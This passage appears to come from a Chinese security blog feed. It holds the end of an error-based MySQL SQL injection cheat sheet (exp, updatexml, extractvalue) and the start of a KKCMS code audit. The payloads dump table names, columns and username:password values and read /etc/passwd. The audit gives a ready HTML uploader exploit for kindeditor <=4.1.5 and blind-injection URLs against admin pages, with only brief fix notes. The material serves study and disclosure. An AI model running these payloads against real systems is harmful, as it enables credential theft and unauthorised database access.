class="line"><span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> database(</span>))a))</span>;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">and</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> user (</span>) ) a) )</span>;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database(</span>) limit 0,1)x))</span>;<span class="comment">//表名</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span>)x))</span>;<span class="comment">//列名</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~ (<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,id, username, password</span>) <span class="keyword">from</span> users limit 0,1)x))</span>;<span class="comment">//值</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span>(concat(@:=<span class="number">0</span>,(<span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">*</span>)<span class="keyword">from</span>`information_schema`.columns <span class="keyword">where</span> table_schema</span>=database()<span class="keyword">and</span>@:=concat(@,<span class="number">0xa</span>,table_schema,<span class="number">0x3a3a</span>,table_name,<span class="number">0x3a3a</span>,column_name)),@)))x))<span class="comment">//从当前的上下文中dump出所有的tables与columns</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span></span>))a))</span>; <span class="comment">//读取文件</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function">insert <span class="keyword">into</span> <span class="title">users</span> (<span class="params">id, username, password</span>) <span class="title">values</span> (<span class="params"><span class="number">2</span>, <span class="string">&#x27;&#x27;</span> ^ exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> user(</span>))x)), &#x27;Eyre&#x27;)</span>;<span class="comment">//Injection in Insert</span></span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">&#x27;exp(~((select &#x27;</span>root@localhost<span class="string">&#x27; from dual)))&#x27;</span></span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="function">insert <span class="keyword">into</span> <span class="title">users</span> (<span class="params">id, username, password</span>) <span class="title">values</span> (<span class="params"><span class="number">2</span>, <span class="string">&#x27;&#x27;</span> | exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span>(concat(@:=<span class="number">0</span>,(<span class="keyword">select</span> count(*</span>)<span class="keyword">from</span>`information_schema`.columns <span class="keyword">where</span> table_schema</span>=database()<span class="keyword">and</span>@:=concat(@,<span class="number">0xa</span>,table_schema,<span class="number">0x3a3a</span>,table_name,<span class="number">0x3a3a</span>,column_name)),@)))x)), <span class="string">&#x27;Eyre&#x27;</span>);<span class="comment">//DIOS查询</span></span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">&#x27;exp(~((select &#x27;</span><span class="number">000</span></span><br><span class="line">newdb::users::id</span><br><span class="line">newdb::users::username</span><br><span class="line">newdb::users::password<span class="string">&#x27; from dual)))&#x27;</span></span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">update users <span class="keyword">set</span> password=<span class="string">&#x27;Peter&#x27;</span> ^ exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="function"><span class="keyword">select</span> <span class="title">user</span>())x)) <span class="keyword">where</span> id</span>=<span class="number">4</span>;<span class="comment">// Injection in Update</span></span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">&#x27;exp(~((select &#x27;</span>root@localhost<span class="string">&#x27; from dual)))&#x27;</span></span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">delete <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="string">&#x27;1&#x27;</span> | exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="function"><span class="keyword">select</span> <span class="title">user</span>())x))</span>;<span class="comment">//Injection in Delete</span></span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">&#x27;exp(~((select &#x27;</span>root@localhost<span class="string">&#x27; from dual)))&#x27;</span></span><br><span class="line">--------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h3 id="常见问题汇总"><a href="#常见问题汇总" class="headerlink" title="常见问题汇总"></a>常见问题汇总</h3><p>1、a或x代表什么?</p><p>a或x可以是任意的字母,代表的是查询返回的值组成一个集合，这个集合的名字为a或x或其他的,</p><p>2、~是什么意思?</p><p>当涉及到注入时，我们使用否定查询来造成“<code>DOUBLE value is out of range</code>”的错误。</p><p>将0按位取反就会返回“<code>18446744073709551615</code>”，再加上函数成功执行后返回0的</p><p>缘故，我们将成功执行的函数取反就会得到最大的无符号<code>BIGINT</code>值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select ~(select version());</span><br><span class="line">+----------------------+</span><br><span class="line">| ~(select version())  |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551610 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>我们通过子查询与按位求反，造成一个<code>DOUBLE overflow error</code>，并借由此注出数据。</p><p>故~代表取反符号,取反原因见上</p><p>3、exp如果嵌套，那么执行顺序是什么？</p><p>拿&#96;&#96;exp(~(select * from(select user())a))<code>举例</code></p><ul><li>先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a</li><li>然后 再 select * from a 查询a ,将 结果集a 全部查询出来</li></ul><p>‘</p><p>4、select <em>from a ,如果a为root@localhost，那么语句变为select</em> from root@localhsot?没有root@localhost表怎么办?</p><p>做如下实验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;`exp(~(select*from(select user())x))`</span><br><span class="line"></span><br><span class="line">    mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">    ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br></pre></td></tr></table></figure><p>我们会发现会返回<code>exp(~((select &#39;root@localhost&#39; from dual)))</code>这便是通过子查询与按位求反，从而报错注出数据&#96;&#96;root@localhost&#96;</p><p>dual是一个虚拟表，用来构成select的语法规则，即虚拟表为了满足形如<code>select ...from .....;</code>格式<br>比如<br><code>select &#39;root@localhost&#39; from dual;</code></p><blockquote><p><strong>oracle保证dual里面永远只有一条记录</strong></p><p>数据库中都存在dual表，只是mysql中的dual表没有值select * from dual 这种语句会报错，而在Oracle中会返回一行记录（dual表有一条默认值），二者都可以用dual来满足语法结构。</p></blockquote><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><h3 id="原理概述-1"><a href="#原理概述-1" class="headerlink" title="原理概述"></a>原理概述</h3><p>适用版本: 5.1.5+</p><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，<a href="https://www.jb51.net/article/125607.htm">了解Xpath语法</a><br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：<br>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出<br>ERROR 1105 (HY000): XPATH syntax error: ‘:root@localhost’</p><p>另外，updatexml最多只能显示32位，需要配合SUBSTR使用。</p></blockquote><p>前后添加~使其不符合xpath格式从而报错。</p><p>我们通常在第二个xpath参数填写我们要查询的内容。</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><h3 id="常见payload-1"><a href="#常见payload-1" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br><span class="line"></span><br><span class="line">updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line"></span><br><span class="line">通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆数据库版本信息：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line"></span><br><span class="line">链接用户：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br><span class="line"></span><br><span class="line">链接数据库：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br><span class="line"></span><br><span class="line">爆库：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">or extractvalue(1, concat(0x7e, (select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">or extractvalue(1, concat(0x7e, (select concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)))</span><br><span class="line"></span><br><span class="line">爆字段内容：</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">or extractvalue(1, concat(0x7e, (select concat_ws(&#x27;:&#x27;, username, password) from users limit 0,1))) or &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><h3 id="原理概述-2"><a href="#原理概述-2" class="headerlink" title="原理概述"></a>原理概述</h3><p>适用版本: 5.1.5+</p><blockquote><p>extractvalue()：从目标XML中返回包含所查询值的字符串<br>extractvalue (XML_document, XPath_string)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>extractvalue注入的原理：依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p></blockquote><h3 id="常见payload-2"><a href="#常见payload-2" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Audit of KKCMS</title>
      <link href="/2020/07/07/Code-Audit-KKCMS/"/>
      <url>/2020/07/07/Code-Audit-KKCMS/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-验证码重用"><a href="#0x01-验证码重用" class="headerlink" title="0x01 验证码重用"></a>0x01 验证码重用</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200706182145019.png" alt="image-20200706182145019"></p><p>每次失败访问后，都会进行刷新跳转，然后重新执行一次JS代码</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707103504207.png" alt="image-20200707103504207"></p><p>但是由于Burp默认不解析js，所以这里存在验证码复用的漏洞</p><p>抓包显示验证码是8868，连续发送两次包，发现验证码都是0348，没有变过</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707103206168.png" alt="image-20200707103206168"></p><p>在控制器中我们看到了一个参数 verifycode，这个便是验证码，通过跟踪发现verifycode 还出现在 verifycode.php 中 $_SESSION[‘verifycode’]  </p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707104519046.png" alt="image-20200707104519046"></p><p>验证码重用漏洞放到注册界面会造成用户批量注册</p><p>但放在这里危害不大</p><p>目前很多验证码重用漏洞都利用的是burp对js不解析的特性</p><h2 id="0x02-非shell的上传漏洞"><a href="#0x02-非shell的上传漏洞" class="headerlink" title="0x02 非shell的上传漏洞"></a>0x02 非shell的上传漏洞</h2><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707112447375.png" alt="image-20200707112447375"></p><p>从代码可以看出来允许上传html类型的文件</p><p>在后台寻找上传入口无果,</p><p>索性在Seay中跟踪一下发现,存在GET传参dir</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707113541489.png" alt="image-20200707113541489"></p><p>查看kindeditor版本</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707113459374.png" alt="image-20200707113459374"></p><p>确认存在可利用漏洞</p><p>漏洞存在&lt;&#x3D;kindeditor4.1.5版本编辑器</p><p>验证是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kindeditor/asp/upload_json.asp?dir=file</span><br><span class="line"></span><br><span class="line">kindeditor/asp.net/upload_json.ashx?dir=file</span><br><span class="line"></span><br><span class="line">kindeditor/jsp/upload_json.jsp?dir=file</span><br><span class="line"></span><br><span class="line">kindeditor/php/upload_json.php?dir=file</span><br><span class="line"></span><br><span class="line">editor/asp/upload_json.asp?dir=file</span><br><span class="line"></span><br><span class="line">editor/asp.net/upload_json.ashx?dir=file</span><br><span class="line"></span><br><span class="line">editor/jsp/upload_json.jsp?dir=file</span><br><span class="line"></span><br><span class="line">editor/php/upload_json.php?dir=file</span><br></pre></td></tr></table></figure><h3 id="通杀EXP"><a href="#通杀EXP" class="headerlink" title="通杀EXP"></a>通杀EXP</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707132635987.png" alt="image-20200707132635987"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Uploader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lab.l0ki.top/kkcms/editor/kindeditor.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">KindEditor</span>.<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params">K</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> uploadbutton = K.<span class="title function_">uploadbutton</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">button</span>: <span class="title function_">K</span>(<span class="string">&#x27;#uploadButton&#x27;</span>)[<span class="number">0</span>],</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">fieldName</span>: <span class="string">&#x27;imgFile&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&#x27;https://lab.l0ki.top/kkcms/editor/php/upload_json.php?dir=evil&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">afterUpload</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data.<span class="property">error</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> url = K.<span class="title function_">formatUrl</span>(data.<span class="property">url</span>, <span class="string">&#x27;absolute&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">K</span>(<span class="string">&#x27;#url&#x27;</span>).<span class="title function_">val</span>(url);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            uploadbutton.<span class="property">fileBox</span>.<span class="title function_">change</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                uploadbutton.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;ke-input-text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">readonly</span>=<span class="string">&quot;readonly&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;uploadButton&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.直接删除upload_json和file_manager_json</p><p>2.升级kindeditor到最新版本</p><h2 id="0x03-后台登录SQL注入"><a href="#0x03-后台登录SQL注入" class="headerlink" title="0x03 后台登录SQL注入"></a>0x03 后台登录SQL注入</h2><p>在&#x2F;admin&#x2F;cms_login.php中我们发现a_name和a_password没有做任何的过滤就被带入到数据库</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707135630426.png" alt="image-20200707135630426"></p><p>但是通过注入测试发现,好像并没有这么简单</p><p>跟踪引用文件,发现在library.php中有这么一段</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707140642709.png" alt="image-20200707140642709"></p><p>分析代码：</p><p>如果没有开启魔术引号,这个时候不论GET还是POST传参,都会加上addslashes,</p><p>因此在这里的双引号自然就会被加上反斜杠了</p><h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>使用反斜线引用字符串</p><p><strong>addslashes</strong> ( string <code>$str</code> ) : string</p><p>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（*’<em>）、双引号（</em>“<em>）、反斜线（</em>*）与  NUL（**<code>NULL</code>** 字符）。</p><p>一个使用 <strong>addslashes()</strong>  的例子是当你要往数据库中输入数据时。 例如，将名字 <em>O’reilly</em> 插入到数据库中，这就需要对其进行转义。 强烈建议使用 DBMS  指定的转义函数 （比如 MySQL 是 <a href="mysqli.real-escape-string.php">mysqli_real_escape_string()</a>，PostgreSQL  是 <a href="function.pg-escape-string.php">pg_escape_string()</a>），但是如果你使用的  DBMS 没有一个转义函数，并且使用 <em>* 来转义特殊字符，你可以使用这个函数。 仅仅是为了获取插入数据库的数据，额外的</em>*  并不会插入。 当 PHP 指令 <a href="sybase.configuration.php#ini.magic-quotes-sybase">magic_quotes_sybase</a>  被设置成 <em>on</em> 时，意味着插入 <em>‘</em> 时将使用 <em>‘</em> 进行转义。</p><p>PHP 5.4 之前 PHP 指令 <a href="info.configuration.php#ini.magic-quotes-gpc">magic_quotes_gpc</a> 默认是  <em>on</em>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <strong>addslashes()</strong> 了。 不要对已经被 <a href="info.configuration.php#ini.magic-quotes-gpc">magic_quotes_gpc</a>  转义过的字符串使用 **addslashes()**，因为这样会导致双层转义。  遇到这种情况时可以使用函数 <a href="function.get-magic-quotes-gpc.php">get_magic_quotes_gpc()</a> 进行检测。</p><p><strong>参数</strong></p><ul><li><p><code>str</code></p><p>要转义的字符。</p></li></ul><p><strong>返回值</strong></p><p>返回转义后的字符。</p><p><strong>范例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$str</span> = <span class="string">&quot;Is your name O&#x27;reilly?&quot;</span>;</span><br><span class="line"><span class="comment">// 输出： Is your name O\&#x27;reilly?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>关于如何绕过,网上提供两种思路，一种是url编码绕过,另一种是base64编码绕过</p><p>具体的可以<a href="https://www.l0ki.top/archives/254/">参见</a></p><h2 id="0x04-前端SQL注入1"><a href="#0x04-前端SQL注入1" class="headerlink" title="0x04 前端SQL注入1"></a>0x04 前端SQL注入1</h2><p>查看vlist.php文件</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707144658978.png" alt="image-20200707144658978"></p><p>可以看到$_GET[‘cid’]并没有做任何传入参数过滤处理</p><p>用sqlmap可以直接跑出来</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707144317080.png" alt="image-20200707144317080"></p><h2 id="0x05-前台SQL注入2"><a href="#0x05-前台SQL注入2" class="headerlink" title="0x05 前台SQL注入2"></a>0x05 前台SQL注入2</h2><p>查看**&#x2F;ucenter&#x2F;reg.php**,</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707152445262.png" alt="image-20200707152445262"></p><p>分析发现</p><blockquote><p>trim去除空格</p><p>stripslashes旨在删除由 addslashes()函数添加的反斜杠</p></blockquote><p>前面提到引用的文件带有addslashes()函数用反斜杠转义过滤,但是这里使用stripslashes()函数,则抵消了addslashes()函数的作用效果</p><h2 id="0x06-后台多处注入"><a href="#0x06-后台多处注入" class="headerlink" title="0x06 后台多处注入"></a>0x06 后台多处注入</h2><p><strong>&#x2F;admin&#x2F;cms_ad_edit.php</strong></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707153249308.png" alt="image-20200707153249308"></p><p><strong>&#x2F;admin&#x2F;cms_book_edit.php</strong></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707153340670.png" alt="image-20200707153340670"></p><p><strong>&#x2F;admin&#x2F;cms_channel_edit.php</strong></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707153355713.png" alt="image-20200707153355713"></p><p><strong>后台造成SQL注入的原因都一样，是接收的参数id没有使用单引号或双引号包含，导致addslashes()函数失效.</strong></p><p><strong>直接全局搜索$_GET[‘id’]可以发现，后台很多地方其实也存在注入，只要包含$result，基本存在漏洞</strong></p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/kkcms/admin/cms_usergroup_edit.php?id=1%20and%20ascii(left(database(),1))=108--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707160123275.png" alt="image-20200707160123275"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707160047110.png" alt="image-20200707160047110"></p><p>可以根据<a href="https://l0ki.top/archives/256/">ASCII对照表</a>以此类推</p><h2 id="0x07-后台删除SQL注入"><a href="#0x07-后台删除SQL注入" class="headerlink" title="0x07 后台删除SQL注入"></a>0x07 后台删除SQL注入</h2><p><img 